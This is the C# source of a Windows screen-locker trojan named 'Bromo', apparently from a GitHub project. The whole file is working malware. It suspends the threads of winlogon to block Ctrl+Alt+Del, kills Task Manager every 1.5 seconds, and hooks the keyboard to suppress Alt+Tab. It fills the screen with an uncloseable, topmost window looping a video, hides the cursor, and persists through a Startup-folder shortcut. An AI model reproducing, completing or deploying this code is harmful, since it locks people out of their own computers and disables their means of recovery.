using Bromo.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using WMPLib;
using IWshRuntimeLibrary;

//Created for github https://github.com/intcost/BromoTrojan

namespace Bromo
{
    public partial class Form1 : Form
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        const int THREAD_SUSPEND_RESUME = 0x0002;

        [DllImport("user32.dll")]
        private static extern int ShowCursor(bool bShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;

        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;
        private Timer _timer;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public Form1()
        {
            InitializeComponent();
            BromoStartUpSettings();
            this.FormClosing += new FormClosingEventHandler(Form1_FormClosing);
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_CLOSE = 0x0010;

            if (m.Msg == WM_CLOSE)
            {
                return;
            }

            base.WndProc(ref m);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process[] processes = Process.GetProcessesByName("winlogon"); //use it for block any windows binds (ex. Ctrl + Alt + Del)

            if (processes.Length == 0)
            {
                return;
            }

            foreach (Process process in processes)
            {
                foreach (ProcessThread thread in process.Threads)
                {
                    IntPtr pOpenThread = OpenThread(THREAD_SUSPEND_RESUME, false, (uint)thread.Id);

                    if (pOpenThread == IntPtr.Zero)
                    {
                        continue;
                    }

                    SuspendThread(pOpenThread);
                    CloseHandle(pOpenThread);
                }
            }
            this.Text = GenerateRandomTitle();

            _proc = HookCallback;
            _hookID = SetHook(_proc);

            ShowCursor(false);
            pictureBox1.Dock = DockStyle.Fill;
            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            this.WindowState = FormWindowState.Maximized;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;

            axWindowsMediaPlayer1.Size = this.ClientSize;
            axWindowsMediaPlayer1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;

            axWindowsMediaPlayer1.stretchToFit = true;

            byte[] audioBytes = Resources.create_video;
            axWindowsMediaPlayer1.uiMode = "none";
            axWindowsMediaPlayer1.settings.setMode("loop", true);
            axWindowsMediaPlayer1.enableContextMenu = false;

            string tempFilePath = Path.Combine(Path.GetTempPath(), "Paste_here_filename_video.mp4"); //paste here videoname from resources
            System.IO.File.WriteAllBytes(tempFilePath, audioBytes);
            axWindowsMediaPlayer1.URL = tempFilePath;
            _timer = new Timer();
            _timer.Interval = 1500;
            _timer.Tick += Timer_Tick;
            _timer.Start();
        }

        private string GenerateRandomTitle() //random title name
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder title = new StringBuilder();
            Random random = new Random();

            for (int i = 0; i < 10; i++)
            {
                title.Append(chars[random.Next(chars.Length)]);
            }

            return title.ToString();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            var processes = Process.GetProcessesByName("taskmgr"); //kill TaskMGR every 1.5 sec
            foreach (var process in processes)
            {
                process.Kill();
            }
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if ((Control.ModifierKeys & Keys.Alt) == Keys.Alt && vkCode == (int)Keys.Tab)
                {
                    return (IntPtr)1;
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void BromoStartUpSettings()
        {
            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string exePath = Application.ExecutablePath;
            string shortcutPath = Path.Combine(startupFolderPath, "Bromo.lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = exePath;
            shortcut.WorkingDirectory = Path.GetDirectoryName(exePath);
            shortcut.Description = "Bromo.com see you";
            shortcut.Save();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            ShowCursor(true);
            _timer.Stop();
            e.Cancel = true;
        }

        private void axWindowsMediaPlayer1_Enter(object sender, EventArgs e)
        {

        }
    }
}
